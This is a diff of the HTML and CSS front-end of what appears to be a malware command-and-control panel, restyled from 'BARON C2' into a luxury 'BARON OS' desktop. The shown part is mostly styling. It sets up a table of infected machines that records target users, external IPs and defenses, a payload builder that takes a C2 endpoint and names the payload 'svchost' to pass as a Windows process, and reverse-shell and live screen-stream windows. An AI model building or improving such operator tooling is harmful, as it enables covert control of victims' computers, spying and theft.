@@ -3,630 +3,718 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BARON C2 · ABSOLUTE GOD</title>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<title>BARON OS · V3</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
-/* ─── CSS Variables & Core ─── */
+/* 
+ * BARON OS V3 - "THE RICH BARON" 
+ * Luxury Desktop Environment 
+ */
+
 :root {
-  --gold: #D4AF37; --gold-glow: rgba(212,175,55,0.4); --gold-dim: rgba(212,175,55,0.15);
-  --bg-dark: #020305; --bg-panel: rgba(10,12,18,0.55);
-  --text: #ffffff; --text-dim: rgba(255,255,255,0.6);
-  --border: rgba(255,255,255,0.08); --border-bright: rgba(255,255,255,0.25);
-  --sans: 'Outfit', sans-serif; --mono: 'JetBrains Mono', monospace;
-  --blur: 40px; --radius: 24px;
-  --red: #ff3b5c; --green: #00ff88; --blue: #00e5ff;
+  --bg-color: #050505;
+  --panel-bg: rgba(15, 15, 15, 0.65);
+  --border-color: rgba(255, 215, 0, 0.15); /* Subtle Gold border */
+  --highlight: #d4af37; /* Metallic Gold */
+  --text-main: #f5f5f5;
+  --text-dim: #a0a0a0;
+  --danger: #b91c1c;
+  --success: #15803d;
+  --glass-blur: blur(24px);
+  --shadow-gold: 0 4px 30px rgba(212, 175, 55, 0.1);
+  --shadow-window: 0 20px 50px rgba(0,0,0,0.8), 0 0 0 1px var(--border-color);
+  --font-serif: 'Playfair Display', serif;
+  --font-sans: 'Inter', sans-serif;
+  --font-mono: 'JetBrains Mono', monospace;
+  --z-desktop: 1;
+  --z-dock: 1000;
+  --z-window: 100;
+  --z-modal: 9000;
+  --z-context: 9500;
 }
-:root[data-theme="sapphire"] { --gold: #00e5ff; --gold-glow: rgba(0,229,255,0.4); --gold-dim: rgba(0,229,255,0.15); }
-:root[data-theme="emerald"] { --gold: #00ff88; --gold-glow: rgba(0,255,136,0.4); --gold-dim: rgba(0,255,136,0.15); }
-:root[data-theme="ruby"] { --gold: #ff3b5c; --gold-glow: rgba(255,59,92,0.4); --gold-dim: rgba(255,59,92,0.15); }
-:root[data-theme="amethyst"] { --gold: #b05bff; --gold-glow: rgba(176,91,255,0.4); --gold-dim: rgba(176,91,255,0.15); }
 
-* { margin:0; padding:0; box-sizing:border-box; }
-html, body { height:100%; overflow:hidden; background:var(--bg-dark); color:var(--text); font-family:var(--sans); }
-::-webkit-scrollbar { width:4px; height:4px; } ::-webkit-scrollbar-thumb { background:var(--gold-dim); border-radius:4px; }
+* { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
 
-/* ─── 3D Environment & FX ─── */
-#three-canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; background:radial-gradient(ellipse at center, #05070a 0%, #000000 100%); }
-.scanlines { position:fixed; inset:0; z-index:1; pointer-events:none; background:linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.1)); background-size:100% 4px; opacity:0.3; }
-.vignette { position:fixed; inset:0; z-index:2; pointer-events:none; background:radial-gradient(circle at center, transparent 40%, rgba(0,0,0,0.8) 120%); }
-
-/* ─── HUD Layout (No Sidebar) ─── */
-#hud { position:fixed; inset:0; z-index:10; pointer-events:none; display:none; perspective:1200px; padding:40px; gap:40px; }
-.panel {
-  pointer-events:auto; background:var(--bg-panel); backdrop-filter:blur(var(--blur)) saturate(180%);
-  border:1px solid var(--border); border-top:1px solid var(--border-bright);
-  border-radius:var(--radius); box-shadow:0 30px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1);
-  display:flex; flex-direction:column; transition:0.6s cubic-bezier(0.16,1,0.3,1);
+body {
+  background-color: var(--bg-color);
+  color: var(--text-main);
+  font-family: var(--font-sans);
+  overflow: hidden; /* OS environment, no global scrolling */
+  width: 100vw; height: 100vh;
 }
-.panel:hover { border-color:var(--gold-dim); box-shadow:0 30px 80px rgba(0,0,0,0.8), 0 0 40px var(--gold-dim); padding-left:1px; }
 
-/* ─── Left Panel: Navigation & Core ─── */
-#left-panel { width:280px; height:calc(100vh - 80px); transform:rotateY(5deg); pointer-events:auto; z-index:20; }
-.brand { padding:30px; border-bottom:1px solid var(--border); text-align:center; }
-.brand-logo { font-size:2rem; font-weight:900; letter-spacing:10px; background:linear-gradient(135deg,#fff,var(--gold)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 0 20px var(--gold-dim); }
-.brand-sub { font-size:0.65rem; color:var(--gold); letter-spacing:4px; text-transform:uppercase; margin-top:4px; }
-.nav { flex:1; padding:20px; overflow-y:auto; display:flex; flex-direction:column; gap:8px; }
-.nav-item { padding:14px 20px; border-radius:14px; font-size:0.9rem; font-weight:500; color:var(--text-dim); cursor:pointer; display:flex; align-items:center; gap:16px; transition:0.3s; border:1px solid transparent; }
-.nav-item:hover { color:var(--text); background:rgba(255,255,255,0.03); transform:translateX(6px); }
-.nav-item.active { color:var(--gold); background:var(--gold-dim); border-color:rgba(255,255,255,0.1); box-shadow:0 0 20px var(--gold-dim); transform:translateX(10px); }
-.nav-item svg { width:20px; height:20px; }
-.left-footer { padding:20px; border-top:1px solid var(--border); }
-.theme-picker { display:flex; gap:10px; justify-content:center; margin-bottom:16px; }
-.theme-dot { width:16px; height:16px; border-radius:50%; cursor:pointer; transition:0.3s; border:1px solid rgba(255,255,255,0.2); box-shadow:0 0 10px rgba(0,0,0,0.5); }
-.theme-dot:hover { transform:scale(1.4); }
-
-/* ─── Center Stage: Dynamic Content ─── */
-#center-stage { flex:1; height:calc(100vh - 80px); display:flex; flex-direction:column; transform:translateZ(0); pointer-events:none; }
-.cs-header { height:80px; margin-bottom:20px; display:flex; align-items:center; justify-content:space-between; background:var(--bg-panel); backdrop-filter:blur(var(--blur)); border-radius:var(--radius); border:1px solid var(--border); border-top:1px solid var(--border-bright); padding:0 30px; pointer-events:auto; box-shadow:0 20px 40px rgba(0,0,0,0.5); }
-.pg-title { font-size:1.4rem; font-weight:700; letter-spacing:2px; text-transform:uppercase; text-shadow:0 2px 10px rgba(0,0,0,0.5); }
-.cs-header-info { display:flex; gap:20px; align-items:center; }
-.time-chip { font-family:var(--mono); color:var(--gold); font-size:0.85rem; background:var(--gold-dim); padding:8px 16px; border-radius:20px; border:1px solid rgba(255,255,255,0.1); box-shadow:0 0 15px var(--gold-dim); }
-
-.page { display:none; flex:1; flex-direction:column; gap:24px; animation:glitchIn 0.5s cubic-bezier(0.16,1,0.3,1); pointer-events:auto; overflow-y:auto; padding-right:10px; }
-.page.active { display:flex; }
-@keyframes glitchIn { 0% { opacity:0; transform:scale(0.95) translateY(20px); filter:blur(10px); } 100% { opacity:1; transform:scale(1) translateY(0); filter:blur(0); } }
-
-/* ─── Right Panel: Terminal & Logs ─── */
-#right-panel { width:340px; height:calc(100vh - 80px); transform:rotateY(-5deg); pointer-events:auto; z-index:20; }
-.rp-header { padding:20px; border-bottom:1px solid var(--border); font-size:0.8rem; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:var(--gold); text-align:center; }
-.log-stream { flex:1; padding:20px; overflow-y:auto; font-family:var(--mono); font-size:0.75rem; display:flex; flex-direction:column; gap:12px; }
-.log-entry { padding-left:12px; border-left:2px solid var(--border); animation:fadeLeft 0.3s ease; line-height:1.6; }
-@keyframes fadeLeft { 0%{opacity:0;transform:translateX(10px);} 100%{opacity:1;transform:translateX(0);} }
-.log-time { color:var(--text-dim); margin-right:8px; }
-.log-info { border-color:var(--blue); } .log-info .log-msg { color:var(--text); }
-.log-warn { border-color:var(--gold); } .log-warn .log-msg { color:var(--gold); }
-.log-error { border-color:var(--red); } .log-error .log-msg { color:var(--red); text-shadow:0 0 8px rgba(255,59,92,0.6); }
-
-/* ─── UI Components ─── */
-.stat-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:20px; }
-.stat-card {
-  background:linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 100%), rgba(0,0,0,0.4);
-  backdrop-filter:blur(20px); border:1px solid var(--border); border-top:1px solid var(--border-bright);
-  padding:24px; border-radius:20px; position:relative; overflow:hidden; transition:0.4s;
-  box-shadow:0 10px 30px rgba(0,0,0,0.5); cursor:grab;
+/* Luxury Animated Background */
+#os-background {
+  position: absolute; top:0; left:0; width:100%; height:100%; z-index: 0;
+  background: radial-gradient(circle at 50% 50%, #1a1608 0%, #050505 100%);
+  overflow: hidden;
 }
-.stat-card:hover { transform:translateY(-5px) scale(1.02); border-color:var(--gold); box-shadow:0 20px 40px rgba(0,0,0,0.8), 0 0 30px var(--gold-dim); }
-.stat-card::after { content:''; position:absolute; top:-50px; right:-50px; width:100px; height:100px; background:radial-gradient(circle, var(--gold-glow), transparent 70%); border-radius:50%; opacity:0; transition:0.5s; }
-.stat-card:hover::after { opacity:1; transform:scale(2); }
-.stat-title { font-size:0.7rem; text-transform:uppercase; letter-spacing:3px; color:var(--gold); margin-bottom:8px; font-weight:600; }
-.stat-val { font-size:3.5rem; font-weight:900; line-height:1; letter-spacing:-2px; text-shadow:0 5px 20px rgba(255,255,255,0.3); }
+.gold-orb {
+  position: absolute; border-radius: 50%; filter: blur(100px);
+  background: rgba(212, 175, 55, 0.15);
+  animation: floatOrb 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
+}
+@keyframes floatOrb {
+  0% { transform: translate(0, 0) scale(1); }
+  100% { transform: translate(100px, -50px) scale(1.5); }
+}
 
-.glass-box { background:rgba(0,0,0,0.3); backdrop-filter:blur(20px); border:1px solid var(--border); border-radius:20px; padding:24px; transition:0.4s; overflow:hidden; }
-.glass-box:hover { border-color:rgba(255,255,255,0.15); box-shadow:0 15px 35px rgba(0,0,0,0.6); }
-.box-title { font-size:1rem; font-weight:700; margin-bottom:20px; letter-spacing:1px; display:flex; align-items:center; justify-content:space-between; }
+/* Scrollbars */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: rgba(212,175,55,0.3); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: rgba(212,175,55,0.6); }
 
-/* ─── Tables ─── */
-.table-wrap { overflow-x:auto; }
-table { width:100%; border-collapse:collapse; text-align:left; }
-th { padding:14px; font-size:0.65rem; text-transform:uppercase; letter-spacing:4px; color:var(--gold); border-bottom:1px solid var(--border); }
-td { padding:16px 14px; font-size:0.85rem; border-bottom:1px solid rgba(255,255,255,0.03); vertical-align:middle; transition:0.2s; }
-tr:hover td { background:rgba(255,255,255,0.02); color:white; }
-.pill { padding:4px 10px; border-radius:12px; font-size:0.75rem; font-weight:600; text-transform:uppercase; letter-spacing:1px; display:inline-flex; align-items:center; gap:6px; background:rgba(255,255,255,0.05); }
-.pill-on { color:var(--green); background:rgba(0,255,136,0.1); border:1px solid rgba(0,255,136,0.3); box-shadow:0 0 10px rgba(0,255,136,0.2); }
-.pill-off { color:var(--red); background:rgba(255,59,92,0.1); border:1px solid rgba(255,59,92,0.3); }
-.dot { width:6px; height:6px; border-radius:50%; background:currentColor; box-shadow:0 0 8px currentColor; }
+/* UI Primitives */
+input, select, button, textarea {
+  background: rgba(0,0,0,0.4); border: 1px solid var(--border-color);
+  color: var(--text-main); font-family: var(--font-sans); padding: 8px 12px;
+  border-radius: 6px; outline: none; transition: all 0.2s; user-select: text;
+}
+input:focus, select:focus, textarea:focus { border-color: var(--highlight); box-shadow: 0 0 10px rgba(212,175,55,0.2); }
+button { cursor: pointer; text-transform: uppercase; font-size: 0.8rem; font-weight: 600; letter-spacing: 1px; }
+button:hover { background: rgba(212,175,55,0.15); border-color: var(--highlight); }
+button.gold-btn { background: rgba(212,175,55,0.2); border-color: var(--highlight); color: #fff; }
+button.gold-btn:hover { background: rgba(212,175,55,0.4); box-shadow: 0 0 15px rgba(212,175,55,0.4); }
 
-/* ─── Buttons & Inputs ─── */
-.btn { padding:12px 24px; border-radius:12px; font-family:var(--sans); font-weight:700; font-size:0.85rem; letter-spacing:1px; cursor:pointer; transition:0.3s; border:none; outline:none; display:inline-flex; align-items:center; gap:8px; justify-content:center; }
-.btn-prime { background:linear-gradient(135deg, var(--gold), color-mix(in srgb, var(--gold) 50%, black)); color:#000; box-shadow:0 5px 15px var(--gold-dim), inset 0 1px 0 rgba(255,255,255,0.5); }
-.btn-prime:hover { transform:translateY(-2px); box-shadow:0 8px 25px var(--gold-glow), inset 0 1px 0 rgba(255,255,255,0.8); }
-.btn-prime:active { transform:scale(0.95); }
-.btn-ghost { background:rgba(255,255,255,0.03); color:var(--text); border:1px solid rgba(255,255,255,0.1); backdrop-filter:blur(10px); }
-.btn-ghost:hover { background:rgba(255,255,255,0.1); border-color:var(--gold); color:#fff; transform:translateY(-2px); box-shadow:0 5px 15px rgba(0,0,0,0.5); }
-.btn-danger { background:rgba(255,59,92,0.15); color:var(--red); border:1px solid rgba(255,59,92,0.3); }
-.btn-danger:hover { background:rgba(255,59,92,0.3); color:#fff; box-shadow:0 0 20px rgba(255,59,92,0.5); }
+/* --- LOGIN SCREEN --- */
+#login-screen {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  display: flex; justify-content: center; align-items: center;
+  z-index: var(--z-modal);
+  background: var(--bg-color);
+  transition: opacity 0.8s;
+}
+.login-box {
+  background: var(--panel-bg); backdrop-filter: var(--glass-blur);
+  padding: 50px; border-radius: 12px; box-shadow: var(--shadow-window);
+  text-align: center; width: 400px;
+}
+.login-box h1 { font-family: var(--font-serif); color: var(--highlight); font-size: 2.5rem; margin-bottom: 30px; letter-spacing: 2px; }
+.login-box input { width: 100%; margin-bottom: 20px; font-size: 1.1rem; padding: 12px; }
+.login-box button { width: 100%; padding: 12px; font-size: 1rem; }
 
-.input { width:100%; padding:14px 18px; background:rgba(0,0,0,0.4); border:1px solid var(--border); border-radius:12px; color:#fff; font-family:var(--sans); font-size:0.9rem; transition:0.3s; outline:none; }
-.input:focus { border-color:var(--gold); box-shadow:0 0 0 3px var(--gold-dim), 0 10px 20px rgba(0,0,0,0.5); background:rgba(0,0,0,0.6); }
+/* --- OS DOCK / TASKBAR --- */
+#os-dock {
+  position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%);
+  background: rgba(10,10,10,0.7); backdrop-filter: var(--glass-blur);
+  border: 1px solid var(--border-color); border-radius: 16px;
+  display: flex; padding: 8px 16px; gap: 16px; z-index: var(--z-dock);
+  box-shadow: var(--shadow-gold);
+}
+.dock-item {
+  width: 48px; height: 48px; border-radius: 12px; display: flex;
+  justify-content: center; align-items: center; color: var(--text-dim);
+  font-size: 1.2rem; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  position: relative;
+}
+.dock-item:hover { color: var(--highlight); transform: translateY(-8px) scale(1.1); background: rgba(212,175,55,0.1); }
+.dock-item::after { 
+  content: attr(data-tooltip); position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
+  background: rgba(0,0,0,0.8); color: #fff; padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border-color);
+  font-size: 0.75rem; white-space: nowrap; opacity: 0; pointer-events: none; transition: opacity 0.2s; font-family: var(--font-sans);
+}
+.dock-item:hover::after { opacity: 1; }
 
-/* ─── Context Menu ─── */
-#ctx-menu { position:fixed; z-index:9999; background:rgba(5,7,12,0.85); backdrop-filter:blur(30px) saturate(200%); border:1px solid var(--border); border-top:1px solid var(--border-bright); border-radius:16px; padding:8px; min-width:240px; box-shadow:0 20px 50px rgba(0,0,0,0.8), 0 0 30px var(--gold-dim); display:none; flex-direction:column; transform-origin:top left; animation:menuIn 0.2s cubic-bezier(0.16,1,0.3,1); }
-@keyframes menuIn { 0%{opacity:0;transform:scale(0.9) translateY(10px);} 100%{opacity:1;transform:scale(1) translateY(0);} }
-#ctx-menu.show { display:flex; }
-.ctx-item { padding:10px 16px; font-size:0.85rem; border-radius:8px; cursor:pointer; transition:0.2s; color:var(--text); display:flex; align-items:center; gap:10px; }
-.ctx-item:hover { background:var(--gold-dim); color:var(--gold); padding-left:22px; }
-.ctx-header { padding:8px 16px; font-size:0.6rem; text-transform:uppercase; letter-spacing:3px; color:var(--gold); font-weight:700; opacity:0.7; }
-.ctx-divider { height:1px; background:var(--border); margin:6px 0; }
-.ctx-danger:hover { background:rgba(255,59,92,0.15); color:var(--red); padding-left:22px; }
+.dock-separator { width: 1px; background: var(--border-color); margin: 0 8px; }
 
-/* ─── Loader & Terminal ─── */
-.terminal { background:#000; border:1px solid var(--border); border-radius:14px; overflow:hidden; font-family:var(--mono); font-size:0.8rem; box-shadow:inset 0 0 30px rgba(0,0,0,1); }
-.term-bar { background:rgba(255,255,255,0.05); padding:12px 16px; display:flex; gap:8px; border-bottom:1px solid var(--border); }
-.term-dot { width:12px; height:12px; border-radius:50%; }
-.term-body { padding:16px; height:300px; overflow-y:auto; color:#0f0; white-space:pre-wrap; }
+/* Desktop Env */
+#os-desktop { position: absolute; top:0; left:0; width:100%; height:100%; z-index: var(--z-desktop); }
 
-/* ─── Login Screen ─── */
-#login { position:fixed; inset:0; z-index:9000; background:rgba(0,0,0,0.8); backdrop-filter:blur(50px); display:flex; align-items:center; justify-content:center; transition:0.8s; }
-.login-box { width:420px; text-align:center; animation:fadeUp 0.8s cubic-bezier(0.16,1,0.3,1); }
-@keyframes fadeUp { 0%{opacity:0;transform:translateY(40px) scale(0.95);} 100%{opacity:1;transform:translateY(0) scale(1);} }
-.login-title { font-size:3rem; font-weight:900; letter-spacing:15px; margin-bottom:10px; background:linear-gradient(to bottom, #fff, var(--gold)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 10px 30px var(--gold-glow); }
+/* --- WINDOW MANAGER --- */
+.os-window {
+  position: absolute; background: rgba(12, 12, 12, 0.85);
+  backdrop-filter: blur(30px); border: 1px solid var(--border-color);
+  border-radius: 10px; box-shadow: var(--shadow-window);
+  display: flex; flex-direction: column; overflow: hidden;
+  min-width: 300px; min-height: 200px;
+  animation: windowOpen 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+}
+@keyframes windowOpen {
+  0% { transform: scale(0.95); opacity: 0; }
+  100% { transform: scale(1); opacity: 1; }
+}
+
+.os-window.active { border-color: rgba(212,175,55,0.4); box-shadow: 0 0 40px rgba(212,175,55,0.15); }
+
+.os-titlebar {
+  background: rgba(0,0,0,0.5); padding: 8px 12px; display: flex; align-items: center; justify-content: space-between;
+  cursor: grab; border-bottom: 1px solid rgba(255,255,255,0.05); user-select: none;
+}
+.os-titlebar:active { cursor: grabbing; }
+.os-title { font-family: var(--font-serif); font-size: 0.95rem; color: var(--highlight); letter-spacing: 1px; }
+.os-controls { display: flex; gap: 8px; }
+.os-btn { width: 14px; height: 14px; border-radius: 50%; cursor: pointer; transition: 0.2s; border: none; }
+.btn-close { background: #ed6a5e; }
+.btn-close:hover { background: #f04333; }
+.btn-max { background: #f4be4f; }
+.btn-max:hover { background: #e0a322; }
+
+.os-content { flex: 1; position: relative; overflow: auto; padding: 16px; }
+
+/* Resizer */
+.os-resize { position: absolute; right: 0; bottom: 0; width: 15px; height: 15px; cursor: se-resize; z-index: 10; }
+
+/* --- SPECIFIC APP CONTENT --- */
+
+/* Network (Clients Table) */
+table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+th, td { text-align: left; padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+th { color: var(--text-dim); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px; }
+tr:hover { background: rgba(255,255,255,0.02); }
+.agent-row { cursor: context-menu; transition: background 0.2s; }
+.status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 8px var(--success); margin-right: 8px; }
+.status-dot.offline { background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+
+/* Builder */
+.builder-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+.builder-section { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); }
+.builder-section h3 { margin-bottom: 15px; color: var(--highlight); font-family: var(--font-serif); }
+.b-row { display: flex; flex-direction: column; gap: 5px; margin-bottom: 15px; }
+.b-row label { font-size: 0.8rem; color: var(--text-dim); }
+
+/* Telemetry (Logs) */
+.log-line { font-family: var(--font-mono); font-size: 0.8rem; padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.02); display: flex; gap: 10px; }
+.log-time { color: var(--highlight); }
+.log-info { color: #60a5fa; }
+.log-warn { color: #fbbf24; }
+.log-err { color: #ef4444; }
+.log-cmd { color: #a78bfa; }
+
+/* Reverse Shell */
+.term-container { background: #000; padding: 10px; border-radius: 6px; font-family: var(--font-mono); font-size: 0.85rem; height: 100%; display: flex; flex-direction: column; border: 1px solid rgba(255,255,255,0.1); }
+.term-output { flex:1; overflow-y: auto; color: #0f0; white-space: pre-wrap; margin-bottom: 10px; }
+.term-input { display: flex; align-items: center; }
+.term-input span { color: #0f0; margin-right: 8px; }
+.term-input input { flex:1; background: transparent; border: none; font-family: var(--font-mono); color: #fff; padding:0; outline:none; }
+.term-input input:focus { box-shadow: none; border:none; }
+
+/* Screen Stream */
+.stream-wrapper { display: flex; flex-direction: column; height: 100%; gap: 10px; align-items: center; justify-content: center; }
+.stream-obj { max-width: 100%; max-height: calc(100% - 40px); border: 1px solid var(--border-color); border-radius: 4px; }
+.stream-ctrl { display: flex; gap: 10px; }
+
+/* Context Menu */
+#ctx-menu { 
+  position: absolute; background: rgba(10,10,10,0.95); backdrop-filter: var(--glass-blur);
+  border: 1px solid var(--border-color); border-radius: 8px; padding: 5px 0;
+  box-shadow: var(--shadow-window); z-index: var(--z-context); display: none;
+  min-width: 200px;
+}
+.ctx-header { padding: 5px 15px 10px; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 5px; font-family: var(--font-serif); color: var(--highlight); font-size: 0.85rem; }
+.ctx-category { padding: 5px 15px; font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
+.ctx-item { padding: 8px 15px; font-size: 0.85rem; cursor: pointer; transition: 0.2s; display: flex; justify-content: space-between; align-items: center; user-select: none; }
+.ctx-item:hover { background: rgba(212,175,55,0.15); color: var(--highlight); }
+.ctx-item.danger:hover { background: rgba(220, 38, 38, 0.2); color: #ef4444; }
+
+/* Dashboard Cards (WebTop version) */
+.dash-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+.dash-card { background: rgba(0,0,0,0.4); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.3s; }
+.dash-card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.5); border-color: var(--highlight); }
+.dash-val { font-size: 2.5rem; font-family: var(--font-serif); color: var(--highlight); margin-bottom: 5px; }
+.dash-lbl { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+
 </style>
 </head>
 <body>
 
-<!-- Background -->
-<div id="three-canvas"></div>
-<div class="scanlines"></div>
-<div class="vignette"></div>
-
-<!-- Login -->
-<div id="login">
-  <div class="login-box panel" style="padding:50px;">
-    <div class="login-title">BARON</div>
-    <div style="font-size:0.7rem; letter-spacing:6px; color:var(--gold); margin-bottom:40px; text-transform:uppercase;">Absolute Control</div>
-    <input type="text" id="u" class="input" placeholder="ACCESS IDENTITY" style="margin-bottom:16px; text-align:center; letter-spacing:2px;">
-    <input type="password" id="p" class="input" placeholder="PASSPHRASE" style="margin-bottom:30px; text-align:center; letter-spacing:2px;">
-    <button class="btn btn-prime" onclick="doLogin()" style="width:100%; padding:16px; font-size:1rem; letter-spacing:4px;">INITIALIZE HUD</button>
-    <div id="login-err" style="color:var(--red); font-size:0.8rem; margin-top:20px; height:20px;"></div>
+  <div id="os-background">
+    <div class="gold-orb" style="width:50vw; height:50vw; top: -10vw; left: -10vw;"></div>
+    <div class="gold-orb" style="width:40vw; height:40vw; bottom: -5vw; right: -5vw; animation-direction: reverse; animation-duration: 25s;"></div>
   </div>
-</div>
 
-<!-- Main HUD -->
-<div id="hud">
-  
-  <!-- Left Nav -->
-  <aside class="panel" id="left-panel">
-    <div class="brand">
-      <div class="brand-logo">BARON</div>
-      <div class="brand-sub">God Mode V2</div>
+  <div id="login-screen">
+    <div class="login-box">
+      <h1>BARON OS</h1>
+      <input type="text" id="u" placeholder="Username" autocomplete="off">
+      <input type="password" id="p" placeholder="Password" autocomplete="off">
+      <button class="gold-btn" onclick="doLogin()">Authenticate</button>
+      <p id="login-err" style="color:var(--danger); margin-top:15px; font-size:0.85rem;"></p>
     </div>
-    <div class="nav">
-      <div class="nav-item active" onclick="nav(this,'dashboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
-        Command Center
-      </div>
-      <div class="nav-item" onclick="nav(this,'agents')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-        Global Grid
-      </div>
-      <div class="nav-item" onclick="nav(this,'builder')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
-        Forge (Builder)
-      </div>
-      <div class="nav-item" onclick="nav(this,'streams')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg>
-        Live Intel
-      </div>
-    </div>
-    <div class="left-footer">
-      <div class="theme-picker">
-        <div class="theme-dot" style="background:#D4AF37" onclick="setTheme('gold')"></div>
-        <div class="theme-dot" style="background:#00e5ff" onclick="setTheme('sapphire')"></div>
-        <div class="theme-dot" style="background:#00ff88" onclick="setTheme('emerald')"></div>
-        <div class="theme-dot" style="background:#ff3b5c" onclick="setTheme('ruby')"></div>
-        <div class="theme-dot" style="background:#b05bff" onclick="setTheme('amethyst')"></div>
-      </div>
-      <button class="btn btn-ghost" style="width:100%; border-color:transparent; color:var(--red);" onclick="logout()">DISCONNECT</button>
-    </div>
-  </aside>
-
-  <!-- Center Stage -->
-  <main id="center-stage">
-    <div class="cs-header">
-      <div class="pg-title" id="pg-title">Command Center</div>
-      <div class="cs-header-info">
-        <button class="btn btn-ghost" onclick="fetchAll()">SYNCHRONIZE</button>
-        <div class="time-chip" id="clock">00:00:00</div>
-      </div>
-    </div>
-
-    <!-- Dashboard -->
-    <div id="page-dashboard" class="page active">
-      <div class="stat-grid" id="stats-container">
-        <div class="stat-card" draggable="true"><div class="stat-title">Connected Nodes</div><div class="stat-val" id="s-total">0</div></div>
-        <div class="stat-card" draggable="true"><div class="stat-title">Active Links</div><div class="stat-val" id="s-online" style="color:var(--green)">0</div></div>
-        <div class="stat-card" draggable="true"><div class="stat-title">Payloads Sent</div><div class="stat-val" id="s-tasks">0</div></div>
-        <div class="stat-card" draggable="true"><div class="stat-title">System Uptime</div><div class="stat-val" id="s-uptime">0h</div></div>
-      </div>
-      <div class="glass-box" style="flex:1;">
-        <div class="box-title">Active Deployments <span class="pill pill-on" id="badge-online"><span class="dot"></span>0 ONLINE</span></div>
-        <div class="table-wrap">
-          <table>
-            <thead><tr><th>Node ID</th><th>Hostname</th><th>OS</th><th>Subnet IP</th><th>Status</th><th>Uplink</th></tr></thead>
-            <tbody id="client-table"><tr><td colspan="6" style="text-align:center; color:var(--text-dim); padding:40px;">No Active Nodes</td></tr></tbody>
-          </table>
-        </div>
-      </div>
-    </div>
-
-    <!-- Agents Grid -->
-    <div id="page-agents" class="page">
-      <div class="glass-box" style="flex:1;">
-        <div class="box-title">Global Grid Database</div>
-        <div class="table-wrap">
-          <table>
-            <thead><tr><th>Node ID</th><th>Machine</th><th>Target User</th><th>Ext_IP</th><th>Location</th><th>Defenses</th><th>Status</th></tr></thead>
-            <tbody id="agent-table"><tr><td colspan="7" style="text-align:center; color:var(--text-dim); padding:40px;">Database Empty</td></tr></tbody>
-          </table>
-        </div>
-      </div>
-    </div>
-
-    <!-- Builder -->
-    <div id="page-builder" class="page">
-      <div class="glass-box">
-        <div class="box-title">Payload Forge</div>
-        <div style="display:flex; gap:40px;">
-          <div style="flex:1; display:flex; flex-direction:column; gap:20px;">
-            <div><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px; text-transform:uppercase;">C2 Endpoint</label><input type="text" id="b-server" class="input" placeholder="https://domain.com"></div>
-            <div><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px; text-transform:uppercase;">Payload Name</label><input type="text" id="b-name" class="input" value="svchost"></div>
-            <div style="display:flex; gap:20px;">
